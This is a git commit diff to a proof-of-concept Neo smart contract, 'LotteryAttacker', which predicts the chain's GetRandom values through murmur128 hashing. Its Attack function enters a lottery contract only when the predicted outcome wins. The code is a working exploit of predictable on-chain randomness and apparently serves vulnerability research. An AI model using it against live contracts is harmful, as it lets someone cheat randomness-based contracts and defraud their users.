1905fb3c951de574ad63acea4b4adbc4072ecb97
dusmart <dusmart@qq.com>
2022-04-22 02:17:29 +0800

    refine

--- PoC/PickBeforeUse/LotteryAttacker/LotteryAttacker.cs
+++ PoC/PickBeforeUse/LotteryAttacker/LotteryAttacker.cs
@@ -8,7 +8,7 @@ using Neo.SmartContract.Framework.Attributes;
 using Neo.SmartContract.Framework.Native;
 using Neo.SmartContract.Framework.Services;
 
-namespace Lottery
+namespace LotteryAttacker
 {
     [DisplayName("LotteryAttacker")]
     [ManifestExtra("Author", "NEO")]
@@ -16,24 +16,33 @@ namespace Lottery
     [ManifestExtra("Description", "This is a LotteryAttacker")]
     public class LotteryAttacker : SmartContract
     {
-
         [InitialValue("NQpRgzN6TVoJ7MMTVsHzvvrfidgjtJNEdo", ContractParameterType.Hash160)]
         private static readonly UInt160 Lottery = default;
+        [DisplayName("Predicated")]
+        public static event PredicatedEvent onPredicated;
+        public delegate void PredicatedEvent(BigInteger rand);
+        [DisplayName("RealRandom")]
+        public static event RealRandomEvent onRealRandom;
+        public delegate void RealRandomEvent(BigInteger rand);
 
-        [DisplayName("Entry")]
-        public static event EntryEvent onEntry;
-        public delegate void EntryEvent(UInt160 entry);
-        
+        public static void Predicate() {
+            BigInteger rand = Runtime.GetRandom();
+            for (int i = 0; i < 10; i++) {
+                byte[] nextrand = murmur128(rand.ToByteArray().Concat(new byte[]{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}).Take(16), Runtime.GetNetwork());
+                onPredicated(new BigInteger(nextrand.Concat(new byte[]{0x00})));
+                rand = Runtime.GetRandom();
+                onRealRandom(rand);
+            }
+        }
+
         public static void OnNEP17Payment(UInt160 from, BigInteger amount, object data)
         {
         }
-        public static int Attack() {
-            onEntry(Runtime.EntryScriptHash);
-            onEntry(Runtime.CallingScriptHash);
 
+        public static int Attack() {
             BigInteger rand = Runtime.GetRandom();
             for (int i = 0; i < 10; i++) {
-                byte[] nextrand = murmur128(rand.ToByteArray(), Runtime.GetNetwork());
+                byte[] nextrand = murmur128(rand.ToByteArray().Concat(new byte[]{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}).Take(16), Runtime.GetNetwork());
                 if ((new BigInteger(nextrand)) % 2 == 1) {
                     ExecutionEngine.Assert(NEO.Transfer(Runtime.ExecutingScriptHash, Lottery, 1, null));
                     return i;
@@ -42,17 +51,15 @@ namespace Lottery
             }
             return 0;
         }
+
         public static void Update(ByteString nefFile, string manifest)
         {
             ContractManagement.Update(nefFile, manifest, null);
         }
+        
         public static byte[] murmur128(byte[] nonceData, uint seed) {
-            // ExecutionEngine.Assert(nonceData.Length == 16, "invalid nonce length");
-            return Murmur128.HashCore(nonceData, seed);
-        }
-
-        public static bool check(byte[] nonceData, uint seed) {
-            return nonceData.Length == 16;
+            ExecutionEngine.Assert(nonceData.Length == 16, "invalid nonce length");
+            return Murmur128.Hash(nonceData, seed);
         }
     }
 }
